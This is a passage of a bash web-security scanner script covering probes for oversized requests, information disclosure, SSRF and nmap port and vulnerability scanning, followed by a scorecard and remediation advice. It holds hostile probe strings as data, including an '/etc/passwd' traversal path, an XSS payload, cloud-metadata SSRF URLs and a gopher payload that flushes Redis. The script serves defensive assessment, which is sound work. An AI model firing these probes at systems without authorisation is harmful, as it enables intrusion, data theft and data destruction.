    warn "Large request body not rejected → ${code}"
fi

section "Oversized Header"
LONG_HDR=$(python3 -c "print('A'*8000)" 2>/dev/null || printf 'A%.0s' {1..8000})
code=$(curl -sk "$TARGET/" \
    -H "X-Custom-Header: ${LONG_HDR}" \
    -o /dev/null -w "%{http_code}" --connect-timeout 8 2>/dev/null)
if [[ "$code" == "400" || "$code" == "431" || "$code" == "403" ]]; then
    pass "Oversized header rejected → ${code}"
else
    warn "Oversized header not rejected → ${code}"
fi

section "Slowloris / Slow Request Probe"
SLOW_TIME=$(curl -sk "$TARGET/" \
    -H "Connection: keep-alive" \
    --limit-rate 100 \
    -o /dev/null -w "%{time_total}" --connect-timeout 5 --max-time 10 2>/dev/null)
info "Slow request time: ${SLOW_TIME}s (timeout hardening check)"

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 11 — INFORMATION DISCLOSURE"
# ──────────────────────────────────────────────────────────────────────────────

section "Error Page Fingerprinting"
ERROR_PATHS=(
    "/?q=<script>alert(1)</script>"
    "/this-page-does-not-exist-$(date +%s)"
    "/../../etc/passwd"
    "/index.php?debug=1"
)
for path in "${ERROR_PATHS[@]}"; do
    body=$(http_body "${TARGET}${path}")
    code=$(http_code "${TARGET}${path}")
    if echo "$body" | grep -qiE "apache/[0-9]|nginx/[0-9]|php/[0-9]|iis/[0-9]"; then
        fail "Server version in error page for: ${path}"
    elif echo "$body" | grep -qiE "stack trace|exception|fatal error|syntax error"; then
        fail "Stack trace / debug info leaked for: ${path}"
    else
        pass "No version in error response for: ${path:0:50} → ${code}"
    fi
done

section "Source Code & Comment Analysis"
BODY=$(http_body "$TARGET")
echo "$BODY" | grep -qiE "TODO|FIXME|HACK|password|secret|api_key|token=" && \
    finding "Sensitive keywords in source (TODO/secret/password/token)"
echo "$BODY" | grep -qiE "<!--.*-->" && \
    info "HTML comments present — review for sensitive data"
echo "$BODY" | grep -qiE "//.*localhost|//.*127\.0\.0\.1|//.*internal\." && \
    finding "Internal addresses referenced in source"

section "Directory Listing"
for dir in "/" "/images/" "/js/" "/css/" "/assets/" "/uploads/" "/static/" "/files/"; do
    body=$(http_body "${TARGET}${dir}")
    if echo "$body" | grep -qi "Index of\|Directory listing"; then
        fail "Directory listing ENABLED: ${dir}"
    fi
done
pass "Directory listing check complete"

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 12 — SSRF PROBES"
# ──────────────────────────────────────────────────────────────────────────────

section "Server-Side Request Forgery"
SSRF_TARGETS=(
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/user-data/"
    "http://metadata.google.internal/computeMetadata/v1/"
    "http://169.254.170.2/v2/metadata"
    "http://localhost/admin"
    "http://127.0.0.1:8080"
    "http://0.0.0.0:22"
    "http://[::1]/admin"
    "http://internal.example.com"
    "dict://127.0.0.1:11211/stats"
    "gopher://127.0.0.1:6379/_%2a1%0d%0a%248%0d%0aflushall"
)
for target in "${SSRF_TARGETS[@]}"; do
    for param in url redirect fetch src href webhook callback; do
        code=$(http_code "${TARGET}/?${param}=${target}")
        body=$(http_body "${TARGET}/?${param}=${target}")
        if echo "$body" | grep -qiE "ami-id|instance-id|computeMetadata|root:|uid="; then
            fail "SSRF SUCCESS via ?${param}= to ${target}"
        elif [[ "$code" == "403" || "$code" == "400" ]]; then
            pass "SSRF blocked: ?${param}=${target:0:40}… → ${code}"
            break
        fi
    done
done

# ──────────────────────────────────────────────────────────────────────────────
banner "MODULE 13 — NMAP PORT & SERVICE SCAN"
# ──────────────────────────────────────────────────────────────────────────────

if command -v nmap &>/dev/null; then

    section "Open Port Discovery (Top 1000)"
    log "  ${DIM}Running nmap — this may take 30-60 seconds...${RESET}"
    NMAP_OUT=$(nmap -sV --open -T4 --top-ports 1000 "$TARGET_DOMAIN" 2>/dev/null)
    if [[ -n "$NMAP_OUT" ]]; then
        OPEN_PORTS=$(echo "$NMAP_OUT" | grep "^[0-9].*open" | awk '{print $1, $3, $4, $5, $6, $7}')
        if [[ -n "$OPEN_PORTS" ]]; then
            while IFS= read -r port_line; do
                PORT=$(echo "$port_line" | awk '{print $1}')
                SERVICE=$(echo "$port_line" | awk '{print $2, $3, $4, $5, $6}')
                # Flag ports that shouldn't be public
                if echo "$PORT" | grep -qE "^(21|22|23|25|3306|5432|6379|27017|11211|5900|3389|8080|8443|8888|9200|9300)/"; then
                    fail "Sensitive port open: ${PORT} ${SERVICE}"
                else
                    info "Open port: ${PORT} ${SERVICE}"
                fi
            done <<< "$OPEN_PORTS"
        else
            pass "No unexpected open ports detected"
        fi
    fi

    section "Web Service Fingerprinting"
    NMAP_HTTP=$(nmap -sV -p 80,443,8080,8443 --script=http-headers,http-methods,http-server-header \
        "$TARGET_DOMAIN" 2>/dev/null)
    if [[ -n "$NMAP_HTTP" ]]; then
        # Supported methods
        METHODS=$(echo "$NMAP_HTTP" | grep -A5 "http-methods" | grep "Supported")
        [[ -n "$METHODS" ]] && info "Supported HTTP methods: $METHODS"

        # Server header from nmap
        NMAP_SERVER=$(echo "$NMAP_HTTP" | grep -i "Server:" | head -1 | xargs)
        [[ -n "$NMAP_SERVER" ]] && info "Server header (nmap): $NMAP_SERVER"

        echo "$NMAP_HTTP" | grep -qi "TRACE\|CONNECT\|PUT\|DELETE" && \
            fail "Dangerous HTTP methods advertised via nmap: $(echo "$NMAP_HTTP" | grep -oE 'TRACE|CONNECT|PUT|DELETE' | sort -u | tr '\n' ' ')"
    fi

    section "TLS/SSL Cipher Enumeration (nmap)"
    NMAP_SSL=$(nmap --script ssl-enum-ciphers -p 443 "$TARGET_DOMAIN" 2>/dev/null)
    if [[ -n "$NMAP_SSL" ]]; then
        # Weak ciphers
        if echo "$NMAP_SSL" | grep -qiE "TLSv1\.0|TLSv1\.1"; then
            fail "Legacy TLS (1.0/1.1) detected by nmap ssl-enum-ciphers"
        else
            pass "No legacy TLS versions detected by nmap"
        fi

        GRADE=$(echo "$NMAP_SSL" | grep "least strength" | awk '{print $NF}')
        [[ -n "$GRADE" ]] && info "Weakest cipher grade: $GRADE"
        [[ "$GRADE" == "A" ]] && pass "Cipher suite grade: A"
        [[ "$GRADE" =~ ^[BC] ]] && warn "Cipher suite grade below A: $GRADE"
        [[ "$GRADE" =~ ^[DEF] ]] && fail "Poor cipher suite grade: $GRADE"

        echo "$NMAP_SSL" | grep -qiE "RC4|NULL|EXPORT|DES|anon" && \
            fail "Weak/null ciphers detected by nmap"
    fi

    section "Common Vulnerability Scripts (nmap)"
    NMAP_VULN=$(nmap --script=http-shellshock,http-slowloris-check,http-csrf \
        -p 80,443 "$TARGET_DOMAIN" 2>/dev/null)

    echo "$NMAP_VULN" | grep -qi "VULNERABLE\|shellshock" && \
        fail "Shellshock vulnerability detected by nmap" || \
        pass "Shellshock check clean"

    echo "$NMAP_VULN" | grep -qi "slowloris" && \
        warn "Slowloris vulnerability flagged by nmap" || \
        pass "Slowloris check clean"

    section "DNS Enumeration (nmap)"
    NMAP_DNS=$(nmap --script=dns-brute --script-args dns-brute.hostlist=/dev/null \
        -p 53 "$TARGET_DOMAIN" 2>/dev/null)
    [[ -n "$NMAP_DNS" ]] && info "DNS nmap result: $(echo "$NMAP_DNS" | grep "dns-brute" | head -3)"

else
    warn "nmap not installed — skipping Module 13"
    warn "Install with: sudo apt-get install nmap   (Debian/Ubuntu)"
    warn "              sudo pacman -S nmap           (Arch)"
    warn "              brew install nmap             (macOS)"
fi

# ──────────────────────────────────────────────────────────────────────────────
banner "RESULTS REPORT"
# ──────────────────────────────────────────────────────────────────────────────

TOTAL=$((PASS + FAIL + WARN))

log ""
log "${WHITE}${BOLD}  ┌─────────────────────────────────────────────────────────────┐${RESET}"
log "${WHITE}${BOLD}  │  SCORE CARD                                                 │${RESET}"
log "${WHITE}${BOLD}  ├─────────────────────────────────────────────────────────────┤${RESET}"
log "${WHITE}${BOLD}  │  ${GREEN}PASS : ${PASS}${WHITE}                                                    │${RESET}"
log "${WHITE}${BOLD}  │  ${RED}FAIL : ${FAIL}${WHITE}                                                    │${RESET}"
log "${WHITE}${BOLD}  │  ${YELLOW}WARN : ${WARN}${WHITE}                                                    │${RESET}"
log "${WHITE}${BOLD}  │  TOTAL: ${TOTAL}                                                   │${RESET}"
log "${WHITE}${BOLD}  └─────────────────────────────────────────────────────────────┘${RESET}"
log ""

# ── Remediation lookup ────────────────────────────────────────────────────────
get_remediation() {
    local msg="$1"
    local fix=""

    # Origin / CDN bypass
    echo "$msg" | grep -qi "CDN BYPASSED\|origin exposed" && \
        fix="Lock ports 80/443 at the firewall level to CDN IP ranges only (iptables / cloud security group). No direct origin access should be possible."

    # Host header
    echo "$msg" | grep -qi "host header" && \
        fix="Validate the Host header against a strict allowlist in Apache/Nginx. Use ServerName + ServerAlias with no wildcard vhosts."

    # XSS
    echo "$msg" | grep -qi "XSS" && \
        fix="Deploy ModSecurity with OWASP CRS. Set Content-Security-Policy to restrict script-src. Encode all user-supplied output server-side."

    # SQLi
    echo "$msg" | grep -qi "SQLi\|SQL" && \
        fix="Use parameterised queries / prepared statements. Enable ModSecurity CRS SQLi rules. Never concatenate user input into queries."

    # LFI / traversal
    echo "$msg" | grep -qi "traversal\|LFI\|passwd" && \
        fix="Block path traversal sequences in ModSecurity (CRS rule 930100+). Validate all file path inputs. Never pass user input directly to file functions."

    # RFI
    echo "$msg" | grep -qi "RFI" && \
        fix="Block external URL schemes (http://, ftp://) in query parameters via ModSecurity. Disable allow_url_include and allow_url_fopen in PHP."

    # CMDi
    echo "$msg" | grep -qi "CMDi\|COMMAND INJECTION\|command injection" && \
        fix="Never pass user input to shell functions. Use parameterised APIs instead of exec/system. ModSecurity CRS covers common CMDi patterns."

    # SSTI
    echo "$msg" | grep -qi "SSTI\|template" && \
        fix="Never render user input through a template engine directly. Use template sandboxing and whitelist allowed template operations."

    # XXE
    echo "$msg" | grep -qi "XXE" && \
        fix="Disable external entity processing in your XML parser. In PHP: libxml_disable_entity_loader(true). In Java: set XMLInputFactory SUPPORT_DTD to false."

    # Log4Shell
    echo "$msg" | grep -qi "log4shell\|jndi" && \
        fix="Deploy ModSecurity rule 1000000 (Log4Shell). Add JNDI lookup detection to WAF. If running Java, upgrade Log4j to 2.17.1+."

    # CRLF
    echo "$msg" | grep -qi "CRLF" && \
        fix="Sanitise all user input used in HTTP response headers. Strip or reject %0d, %0a, %0D, %0A sequences."

    # Version disclosure
    echo "$msg" | grep -qi "version\|server.*exposes\|X-Powered-By\|apache.*error\|version in error" && \
        fix="Set ServerTokens Prod and ServerSignature Off in Apache. Remove X-Powered-By header. Deploy custom error pages that do not include server version."

    # ETag
    echo "$msg" | grep -qi "etag" && \
        fix="Set FileETag None in Apache config to prevent inode/file information leakage via ETag headers."

    # Missing headers
    echo "$msg" | grep -qi "HSTS\|strict-transport" && \
        fix="Add: Header always set Strict-Transport-Security 'max-age=31536000; includeSubDomains; preload' to Apache/Nginx config."

    echo "$msg" | grep -qi "CSP\|content-security-policy" && \
        fix="Add a Content-Security-Policy header. Start with: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'."

    echo "$msg" | grep -qi "X-Frame\|clickjacking" && \
        fix="Add: Header always set X-Frame-Options 'SAMEORIGIN' — or use CSP frame-ancestors directive."

    echo "$msg" | grep -qi "x-content-type\|mime sniff" && \
        fix="Add: Header always set X-Content-Type-Options 'nosniff'"

    echo "$msg" | grep -qi "referrer-policy" && \
        fix="Add: Header always set Referrer-Policy 'strict-origin-when-cross-origin'"

    echo "$msg" | grep -qi "permissions-policy" && \
        fix="Add: Header always set Permissions-Policy 'geolocation=(), camera=(), microphone=()'"

    echo "$msg" | grep -qi "COOP\|cross-origin-opener" && \
        fix="Add: Header always set Cross-Origin-Opener-Policy 'same-origin'"

    echo "$msg" | grep -qi "CORP\|cross-origin-resource" && \
        fix="Add: Header always set Cross-Origin-Resource-Policy 'same-origin'"

    echo "$msg" | grep -qi "COEP\|cross-origin-embedder" && \
        fix="Add: Header always set Cross-Origin-Embedder-Policy 'require-corp' (or 'unsafe-none' for sites loading third-party resources)"

    # Cookie flags
    echo "$msg" | grep -qi "httponly" && \
        fix="Set HttpOnly flag on all session cookies. In Apache: Header edit Set-Cookie ^(.*)$ \$1;HttpOnly;Secure"

    echo "$msg" | grep -qi "^Secure flag\|cookie.*secure" && \
        fix="Set the Secure flag on all cookies to prevent transmission over HTTP."

    echo "$msg" | grep -qi "samesite" && \
        fix="Add SameSite=Strict or SameSite=Lax to cookies to prevent CSRF."

    # Open redirect
    echo "$msg" | grep -qi "open redirect" && \
        fix="Validate all redirect targets against a strict allowlist of known-safe domains. Never use raw user input as a redirect URL."

    # Sensitive file exposure
    echo "$msg" | grep -qi "EXPOSED:\|accessible.*200\|\.env\|\.git\|\.htaccess\|config\|backup\|\.sql\|phpinfo\|server-status\|phpmyadmin\|actuator" && \
        fix="Block access to sensitive paths in Apache: <FilesMatch pattern> Require all denied </FilesMatch>. Remove dev/backup files from the webroot entirely."

    # Directory listing
    echo "$msg" | grep -qi "directory listing" && \
        fix="Add Options -Indexes to your Apache Directory config to disable directory listing globally."

    # HTTP methods
    echo "$msg" | grep -qi "method.*TRACE\|TRACE.*open\|dangerous.*method" && \
        fix="Disable TRACE globally: TraceEnable Off in httpd.conf. Block unused methods with <LimitExcept GET HEAD> Require all denied </LimitExcept>."

    echo "$msg" | grep -qi "method PUT\|method DELETE\|method PATCH\|method CONNECT\|method PROPFIND\|method MOVE\|method COPY" && \
        fix="Restrict HTTP methods with <LimitExcept GET HEAD POST> Require all denied </LimitExcept> inside your Directory block."

    # TLS
    echo "$msg" | grep -qi "legacy TLS\|TLS.*accepted\|TLSv1\.0\|TLSv1\.1" && \
        fix="Set SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1 in Apache SSL config. On Cloudflare: set Minimum TLS Version to 1.2 in SSL/TLS settings."

    echo "$msg" | grep -qi "weak cipher\|poor cipher\|grade.*[BCDEF]" && \
        fix="Update SSLCipherSuite to strong ECDHE/AES-GCM ciphers only. Remove RC4, DES, EXPORT, NULL, and MD5-based ciphers. Use Mozilla SSL Config Generator for current recommendations."

    echo "$msg" | grep -qi "certificate.*expired\|cert.*expired" && \
        fix="Renew the SSL certificate immediately. If using Let's Encrypt: sudo certbot renew. Set up auto-renewal with a cron job or systemd timer."

    echo "$msg" | grep -qi "http.*https redirect\|no http.*https" && \
        fix="Add a rewrite rule: RewriteEngine on / RewriteCond %{SERVER_NAME} =yourdomain.com / RewriteRule ^ https://%{SERVER_NAME}%{REQUEST_URI} [END,NE,R=permanent]"

    # DoS
    echo "$msg" | grep -qi "large request\|oversized header\|request body" && \
        fix="Set LimitRequestBody (e.g. 1048576 for 1MB) and LimitRequestFieldSize 8190 in Apache. Configure ModSecurity SecRequestBodyLimit."

    # SSRF
    echo "$msg" | grep -qi "SSRF" && \
        fix="Block server-side requests to internal ranges (169.254.x.x, 10.x.x.x, 172.16.x.x, 192.168.x.x) at the WAF level. Use ModSecurity rule 931130. Whitelist only required external domains."

    # Slowloris
    echo "$msg" | grep -qi "slowloris" && \
        fix="Set Apache Timeout 60, KeepAliveTimeout 5. Install mod_reqtimeout with RequestReadTimeout header=20-40,minrate=500. Consider a CDN or reverse proxy for additional protection."

    # Stack trace
    echo "$msg" | grep -qi "stack trace\|debug info\|fatal error" && \
        fix="Disable error display in production. In PHP: display_errors = Off, log_errors = On. Configure custom Apache ErrorDocument pages."

    # Sensitive port
    echo "$msg" | grep -qi "sensitive port\|port.*open" && \
        fix="Review firewall rules. Only ports 80, 443 (and 22 from trusted IPs) should be reachable externally. Use cloud security groups / iptables to restrict access."

    # nmap dangerous methods
    echo "$msg" | grep -qi "methods advertised" && \
        fix="Disable dangerous HTTP methods at the server level and confirm ModSecurity is blocking them. Recheck with: curl -X TRACE https://yourdomain.com/"

    # Shellshock
    echo "$msg" | grep -qi "shellshock" && \
        fix="Ensure bash is patched (bash --version should be >= 4.3 patch 25). Remove CGI scripts using bash. Consider blocking User-Agent and Cookie headers containing '() {' via WAF."

    # CSP unsafe
    echo "$msg" | grep -qi "unsafe-eval" && \
        fix="Remove 'unsafe-eval' from CSP script-src. Refactor JavaScript to eliminate eval(), new Function(), and setTimeout(string) usage."

    echo "$msg" | grep -qi "csp wildcard" && \
        fix="Replace wildcard (*) in CSP directives with explicit domain allowlists. A wildcard negates CSP protection."

    # Fallback
    [[ -z "$fix" ]] && fix="Review the finding manually and apply the principle of least privilege. Consult OWASP testing guide: https://owasp.org/www-project-web-security-testing-guide/"

    echo "$fix"
}

# ── Print failures with remediations ─────────────────────────────────────────
if [[ ${#FAIL_MSGS[@]} -gt 0 ]]; then
    log ""
    log "${RED}${BOLD}╔══════════════════════════════════════════════════════════════╗${RESET}"
    log "${RED}${BOLD}║  FAILURES — ACTION REQUIRED                                  ║${RESET}"
    log "${RED}${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"
    log ""
    IDX=1
    for msg in "${FAIL_MSGS[@]}"; do
        log "${RED}${BOLD}  [F${IDX}] ${msg}${RESET}"
        REMED=$(get_remediation "$msg")
        log "${WHITE}  ↳ Remediation: ${REMED}${RESET}"
        log ""
        ((IDX++))
    done
fi

# ── Print warnings ────────────────────────────────────────────────────────────
if [[ ${#WARN_MSGS[@]} -gt 0 ]]; then
    log ""
    log "${YELLOW}${BOLD}╔══════════════════════════════════════════════════════════════╗${RESET}"
    log "${YELLOW}${BOLD}║  WARNINGS — REVIEW RECOMMENDED                               ║${RESET}"
    log "${YELLOW}${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"
    log ""
    IDX=1
    for msg in "${WARN_MSGS[@]}"; do
        log "${YELLOW}${BOLD}  [W${IDX}] ${msg}${RESET}"
        REMED=$(get_remediation "$msg")
        log "${WHITE}  ↳ Recommendation: ${REMED}${RESET}"
        log ""
        ((IDX++))
    done
fi

# ── Final verdict ─────────────────────────────────────────────────────────────
log ""
if [[ $FAIL -eq 0 && $WARN -eq 0 ]]; then
    log "  ${GREEN}${BOLD}✓ All tests passed. No issues found.${RESET}"
elif [[ $FAIL -eq 0 ]]; then
    log "  ${YELLOW}${BOLD}⚠ Passed with ${WARN} warning(s). Review recommendations above.${RESET}"
elif [[ $FAIL -le 5 ]]; then
    log "  ${YELLOW}${BOLD}⚠ ${FAIL} failure(s) detected. Apply remediations above.${RESET}"
else
    log "  ${RED}${BOLD}✗ ${FAIL} failure(s) detected. Immediate remediation required.${RESET}"
fi

log ""
log "  ${DIM}Full log: ${LOG_FILE}${RESET}"
log "  ${DIM}Re-run : bash webscan.sh ${TARGET_DOMAIN} ${ORIGIN_IP}${RESET}"
log ""
